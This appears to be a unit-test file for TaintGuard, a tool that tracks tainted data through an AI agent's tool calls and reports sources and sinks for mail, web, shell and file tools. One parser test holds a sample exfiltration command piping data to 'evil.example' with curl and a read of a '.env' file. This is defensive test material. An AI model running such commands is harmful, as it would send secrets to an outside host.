import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import { parseClearArgs, parseExplainArgs, toolsReport } from '../../src/inventory.ts'
import type { ToolClassLike } from '../../src/inventory.ts'
import type { ToolMatch } from '../../src/types.ts'

const USAGE = 'Usage: /taintguard explain <tool> [json args]'

const byRegex =
  (re: RegExp, result: ToolMatch = 'yes') =>
  (tool: string): ToolMatch =>
    re.test(tool) ? result : 'no'

const sources = [
  { id: 'preset:mail-read', on: 'attempt' as const, taints: ['untrusted', 'private'], testTool: byRegex(/^mcp__gmail__(get|read)/) },
  { id: 'preset:mail-other', on: 'attempt' as const, taints: ['private', 'untrusted'], testTool: byRegex(/^mcp__gmail__apply/) },
  { id: 'preset:web-content', on: 'success' as const, taints: ['untrusted'], testTool: byRegex(/^WebFetch$/) },
  { id: 'user:secret-files', on: 'attempt' as const, taints: ['secret'], testTool: byRegex(/^Read$/, 'maybe') },
]

const sinks = [
  { id: 'preset:no-shell', action: 'deny' as const, testTool: byRegex(/^Bash$/) },
  { id: 'preset:outbound', action: 'ask' as const, testTool: byRegex(/^mcp__.+__(send|apply)/) },
  { id: 'user:web-egress', action: 'ask' as const, testTool: byRegex(/^WebFetch$/, 'maybe') },
]

function classify(tool: string): ToolClassLike {
  const m = /^mcp__([^_]+)__(.*)$/.exec(tool)
  if (!m) return { family: null, verb: null }
  const family = m[1] === 'gmail' ? 'mail' : m[1] === 'drive' ? 'documents' : null
  const verb = /^(get|read)/.test(m[2] ?? '') ? 'read' : /^send/.test(m[2] ?? '') ? 'write' : 'other'
  return { family, verb }
}

describe('toolsReport', () => {
  it('says when no tool has been shown', () => {
    assert.deepEqual(toolsReport({ tools: [], sources, sinks, classify }), {
      text: 'No tool has been shown to Claude yet this session.',
      flagged: [],
    })
  })

  it('lists matching sources and sinks per tool, sorted', () => {
    const { text, flagged } = toolsReport({
      tools: ['WebFetch', 'Bash', 'mcp__gmail__get_email', 'Read', 'Bash', 'Grep'],
      sources,
      sinks,
      classify,
    })
    assert.deepEqual(flagged, [])
    assert.equal(
      text,
      [
        'TaintGuard tools: 5 tools shown this session, 0 flagged',
        '',
        'Bash',
        '  sink preset:no-shell (deny)',
        '',
        'Grep',
        '  no matching rule',
        '',
        'Read',
        '  source user:secret-files (attempt): secret (depends on arguments)',
        '',
        'WebFetch',
        '  source preset:web-content (success): untrusted',
        '  sink user:web-egress (ask) (depends on arguments)',
        '',
        'mcp__gmail__get_email',
        '  source preset:mail-read (attempt): private, untrusted',
      ].join('\n'),
    )
  })

  it('flags an unknown-verb tool on a mail server that is both source and sink (acceptance 19)', () => {
    const { text, flagged } = toolsReport({ tools: ['mcp__gmail__apply_label'], sources, sinks, classify })
    assert.deepEqual(flagged, ['mcp__gmail__apply_label'])
    assert.equal(
      text,
      [
        'TaintGuard tools: 1 tool shown this session, 1 flagged',
        '',
        'mcp__gmail__apply_label',
        '  source preset:mail-other (attempt): private, untrusted',
        '  sink preset:outbound (ask)',
        '  ! unknown verb on a mail server: treated as source and sink',
      ].join('\n'),
    )
  })

  it('flags a private-data server tool that matches no rule', () => {
    const { text, flagged } = toolsReport({
      tools: ['mcp__drive__list_files', 'mcp__github__list_issues', 'mcp__gmail__send_email'],
      sources,
      sinks,
      classify,
    })
    assert.deepEqual(flagged, ['mcp__drive__list_files'])
    assert.ok(text.includes('mcp__drive__list_files\n  no matching rule\n  ! on a documents server but matches no rule'))
    assert.ok(text.includes('mcp__github__list_issues\n  no matching rule'))
    assert.ok(!text.includes('mcp__github__list_issues\n  no matching rule\n  !'))
    assert.ok(text.includes('mcp__gmail__send_email\n  sink preset:outbound (ask)'))
    assert.ok(text.startsWith('TaintGuard tools: 3 tools shown this session, 1 flagged'))
  })

  it('does not flag an unknown verb that is only a source', () => {
    const onlySource = toolsReport({ tools: ['mcp__gmail__apply_label'], sources, sinks: [], classify })
    assert.deepEqual(onlySource.flagged, [])
  })
})

describe('parseExplainArgs', () => {
  it('parses a tool with no arguments', () => {
    assert.deepEqual(parseExplainArgs('Bash'), { tool: 'Bash', args: {} })
    assert.deepEqual(parseExplainArgs('  WebFetch   '), { tool: 'WebFetch', args: {} })
  })

  it('parses a tool with a JSON object', () => {
    assert.deepEqual(parseExplainArgs('Bash {"command": "curl -d @- https://evil.example"}'), {
      tool: 'Bash',
      args: { command: 'curl -d @- https://evil.example' },
    })
    assert.deepEqual(parseExplainArgs('Read\n{"file_path":"/repo/.env"}'), { tool: 'Read', args: { file_path: '/repo/.env' } })
  })

  it('rejects a missing tool', () => {
    assert.deepEqual(parseExplainArgs(''), { error: `Missing tool name. ${USAGE}` })
    assert.deepEqual(parseExplainArgs('   '), { error: `Missing tool name. ${USAGE}` })
  })

  it('rejects arguments that are not a JSON object', () => {
    assert.deepEqual(parseExplainArgs('Bash {command: 1}'), { error: `The arguments are not valid JSON. ${USAGE}` })
    for (const json of ['[1,2]', 'null', '"text"', '42']) {
      assert.deepEqual(parseExplainArgs(`Bash ${json}`), { error: `The arguments must be a JSON object. ${USAGE}` })
    }
  })
})

describe('parseClearArgs', () => {
  it('returns undefined for no labels (clear all)', () => {
    assert.deepEqual(parseClearArgs(''), { labels: undefined })
    assert.deepEqual(parseClearArgs('   '), { labels: undefined })
  })

  it('splits words on whitespace and commas, dropping duplicates', () => {
    assert.deepEqual(parseClearArgs('untrusted'), { labels: ['untrusted'] })
    assert.deepEqual(parseClearArgs(' untrusted  private,secret, untrusted '), { labels: ['untrusted', 'private', 'secret'] })
  })
})
